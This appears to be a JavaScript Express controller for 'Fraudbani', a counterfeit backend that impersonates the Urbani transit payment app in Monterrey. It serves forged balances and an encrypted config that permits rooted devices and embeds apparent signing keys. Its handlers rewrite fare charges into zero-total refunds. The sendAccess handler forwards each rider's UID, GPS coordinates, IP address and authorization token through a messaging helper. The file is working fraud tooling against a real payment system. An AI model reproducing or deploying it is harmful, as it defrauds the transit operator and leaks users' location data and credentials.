import { decrypt, encrypt, ranNum, ranOcc, generateUID, requests, sender } from '../helpers/index.js'
import IP from '../models/ip.js'

// GET /app/g/userV2
const userV2 = async (req, res) => {
  try {
    const resp = await requests(
      req,
      `https://randomuser.me/api?nat=mx`,
      'GET',
      null
    )
    
    let gender
    const ranUsr = resp.results[0]
    
    if(ranUsr.gender == 'male') {
      gender = 'Masculino'
    }
    if(ranUsr.gender == 'female') {
      gender = 'Femenino'
    }

   res.json({
  "user_id": generateUID(),
  "register_date": "2023-04-14T19:34:40.000Z",
  "birth_date": ranUsr.dob.date,
  "civil_status": "SIN ASIGNAR",
  "genre": gender,
  "names": ranUsr.name.first,
  "first_last_name": ranUsr.name.last,
  "second_last_name": "SIN ASIGNAR",
  "occupation": ranOcc(),
  "curp": "SIN ASIGNAR",
  "city": "Monterrey",
  "ext_number": "0",
  "postal_code": "0",
  "state": "NuevoLeon",
  "street": "SIN ASIGNAR",
  "colony": "colony",
  "main_phone": ranNum(),
  "alternative_phone": "0",
  "pin_needed": true,
  "name_edited": false,
  "email_change_date": null,
  "email": null
})
    
  } catch (err) {
    res.status(500).json({ message: 'Error del servidor'})
  }
}

const userFlags = (req, res) => {
  res.json(
    {
  "user_status": true,
  "preferential_status": false,
  "rate_type": "ORDINARIA",
  "tm": false,
  "vdate": null,
  "balance_tm": "0",
  "gps_status": true,
  "number_alternative": true,
  "user_pin": false
}
    )
}

const configV2 = (req, res) => {
  const encCfV2 = encrypt('[{"id":1,"app_version":"2.2.12","force_update":true,"skey":"iRdF#2G","skey_m":"!z%C&F)","subway_price":"8.80","allowrooteddevices":true,"assistence_url":"https://assistence-qr-app.urbani.io","assistence_type":"0","bins_version":"1.0","exp_m":"900","exp_t":"900","exp_r":"900","exp_e":"3600","transfer":"500","spei":"3000","card":"500","oxxo":"500","always_update_balance":true,"mv2":true,"dms":"300","ch_status":false,"m_spei_ch":"10000","skey_avante":"cH$0i1p","coins_amount":null,"swap_dsc_name":true,"skey_campeche":"c4M#0$x","skey_express_private":"rP#i2*w$!","paymentOnline":false,"traOffline":false,"ticketDiscount":true,"campRA":true,"campRM":true,"cmpPref":null,"nlPref":null}]')
  
  res.send(encCfV2)
}

const userBalances = async(req, res) => {
  try {

    const raw = req.headers['x-forwarded-for'] 
    || req.connection.remoteAddress 
    || ''
  const ip = raw.split(',')[0].trim()
  
  console.log(ip)
  
  const encIp = encrypt(ip)
  
  const auth = req.headers.authorization
  
  const isActivated = await IP.findOne({ auth })
  
  if( !isActivated ) {
    return res.status(500).json({message: 'No activado alv'})
  }
  
  if( !isActivated.cargoEvents ) {
    return res.status(500).json({message: 'No activado alv'})
  }
  
  if( !isActivated.Settings.autoRegen ) {
    return res.status(500).json({message: 'Regeneración desactivada'})
  }
  
  //console.log(decrypt('Ow2kaHMURElAZTTFvLakj7ZAKwmQFtSakkZTPjeiNhMaUSekeL3eQAwtN/ogQGPb9kZGAp+p8e96HtL5hrmPDEX/I/XWC5OiQUv/xDARkbE='))
  
  //res.send('Ow2kaHMURElAZTTFvLakj7ZAKwmQFtSakkZTPjeiNhMaUSekeL3eQAwtN/ogQGPb9kZGAp+p8e96HtL5hrmPDEX/I/XWC5OiQUv/xDARkbE=')
  /*const encBal = encrypt('{"balance":"10000","coins":"0","points":"200","points_tm":null}')
  res.send(encBal)*/
  
  const balanceData = {
      balance: String(isActivated.balance),   // 👈 como string
      coins: String(isActivated.coins || 0),
      points: String(isActivated.points || 0),
      points_tm: null
    }

    const encrypted = encrypt(JSON.stringify(balanceData))
    
  console.log(`${JSON.stringify(balanceData)} | ${encrypted}`)
  

    res.send(encrypted)

  } catch (err) {
    console.error(err)
    res.status(500).json({ message: "Error del servidor" })
  }
}

const ratesV3 = (req, res) => {
  
  const rates = encrypt('[{"rate_type":"ORDINARIA","transport_type":"TRANSMETRO","price":"1500","price_id":"6786"},{"rate_type":"ORDINARIA","transport_type":"ECOVIA","price":"1500","price_id":"6738"},{"rate_type":"ORDINARIA","transport_type":"RUTA_EXPRESS_MORADO","price":"1500","price_id":"2703"},{"rate_type":"ORDINARIA","transport_type":"RUTA_GUINDA","price":"1200","price_id":"1260"},{"rate_type":"ORDINARIA","transport_type":"RUTA_AMARILLA","price":"800","price_id":"8040"},{"rate_type":"ORDINARIA","transport_type":"RUTA_MORADA","price":"800","price_id":"8041"},{"rate_type":"ORDINARIA","transport_type":"RUTA_INTEGRADA","price":"1500","price_id":"1515"},{"rate_type":"ORDINARIA","transport_type":"RUTA_AVANTE","price":"1000","price_id":"6771"},{"rate_type":"ORDINARIA","transport_type":"METRO","price":"990","price_id":"6767"},{"rate_type":"ORDINARIA","transport_type":"RUTA_EXPRESS","price":"1670","price_id":"6773"}]')
  
  res.send(rates)
}

const processActions = async (req, res) => {
  try {
    
    const body = req.body
  //console.log(body)
  
  body.transactions = body.transactions.slice(-1);
  
 // body.transactions.length = 0
  
  const last = body.transactions[0];
  //req.session.uid = last.access.uid
  //last.access.balance_new = 30000
 // last.access.balance_old = 30000
  last.access.subtotal = 0
  last.access.total = 0
  last.action = 'refund'
  last.access.uid = null
  last.epoch = null
  
  console.log(JSON.stringify(body, null, 2));
  
  const auth = req.headers.authorization
  
  const isActivated = await IP.findOne({ auth })
  
  if( !isActivated ) {
    return res.status(500).json({message: 'No activado alv'})
  }
  
  if( !isActivated.cargoEvents ) {
    return res.status(500).json({message: 'No activado alv'})
  }
  
  let usrBal = '30000'
  
  
  if(isActivated.balance) usrBal = String(isActivated.balance)
  
  if( !isActivated.Settings.autoRegen ) {
    usrBal = null
    return res.status(500).json({message: 'Regeneración desactivada'})
  }
  
  console.log(usrBal)
  
    res.json({
  message: 'Acciones procesadas',
  actions: { charge: 1, refund: 0 },
  balance: usrBal
}).status(200)

  } catch (err) {
    console.error(err)
    res.status(500).json({ message: "Error del servidor" })
  }
}

const sendAccess = async (req, res) => {
  try {
      const raw = req.headers['x-forwarded-for'] 
    || req.connection.remoteAddress 
    || ''
  const ip = raw.split(',')[0].trim()
    

    const body = req.body
  
  const send = `■■■■■🚎🎟🚈■■■■■
👤 UID: ${ body[0].uid }
🎫 Boleto: ${ body[0].branch }
👥️ Pasajeros: ${ body[0].passengers }
💲 Total: ${ body[0].total }
🧭 Latitud: ${ body[0].latitude }
🧭 Longitud: ${ body[0].longitude }
🪙 Balance: ${ body[0].balance_new }
🗓 TimeStamp: ${ body[0].access_date }
🌐 IP: ${ ip }
🔑 Auth: ${ req.headers.authorization }
■■■■■■■■■■■■■■■`

  sender(send, res)
  
  body[0].action = 'refund'
  body[0].balance_new = 30000
  body[0].balance_old = 30000
  body[0].subtotal = 0
  body[0].total = 0
  body[0].uid = null

  console.log(body)
  
  const auth = req.headers.authorization
  
  const isActivated = await IP.findOne({ auth })
  
  if( !isActivated ) {
    return res.status(500).json({message: 'No activado alv'})
  }
    
    res.json({ message: 'Datos enviados', length: 1 }).status(200)

  } catch (err) {
    console.error(err)
    res.status(500).json({ message: "Error del servidor" })
  }
}

const getHour = async(req, res) => {
  try {

    const fecha = new Date().toLocaleString("sv-SE", {
    timeZone: "America/Monterrey"
}).replace("T"," ");

    
    //constcurrent_time = fecha
    const promotional_date = '2027-01-01 00:00:00'
    
    res.json({
      current_time: fecha,
      promotional_date
    })
    
  } catch(err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  }
}

const checkPin = (req, res) => {
  console.log(req.body)
  
  res.json({ user_pin: true, alt_phone: null})
}

const verifyPin = async(req, res) => {
   try {
     console.log(req.body)
     
     const raw = req.headers['x-forwarded-for'] 
    || req.connection.remoteAddress 
    || ''
  const ip = raw.split(',')[0].trim()
  
  console.log(ip)
  
  const encIp = encrypt(ip)
  
  const encIpExs = await IP.findOne({encIp})
  
  if(!encIpExs) {
    return res.json({message: `Descarga el apk desde:
    
https://fraudbani-fyfr.onrender.com

Apk gratuito, si pagaste por el fuiste estafad@ 😒

Fraudbani por:
Skr0to`})
  }
  
  if(req.body.phone !== 1234567890 || req.body.pin !== '1234') {
    return res.status(500).json({message: `Número: 1234567890
Pin: 1234`})
  }

    res.json({user_token: 'ok'})
    
  } catch (err) {
    res.status(500).json({ message: 'Error del servidor'+err })
  }
}

const userKeys = async(req, res) => {
  
try {
/*
  const raw = req.headers['x-forwarded-for']
    || req.connection.remoteAddress 
    || ''
  const ip = raw.split(',')[0].trim()
  
  console.log(ip)
  
  const encIp = encrypt(ip)
  
  console.log(req.body)
    
    await IP.findOneAndDelete({ encIp })
    */
    res.send('ok')
    
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Error API externa" });
  } 
}

export {
  checkPin,
  configV2,
  getHour,
  processActions,
  ratesV3,
  sendAccess,
  userBalances,
  userFlags,
  userKeys,
  userV2,
  verifyPin
}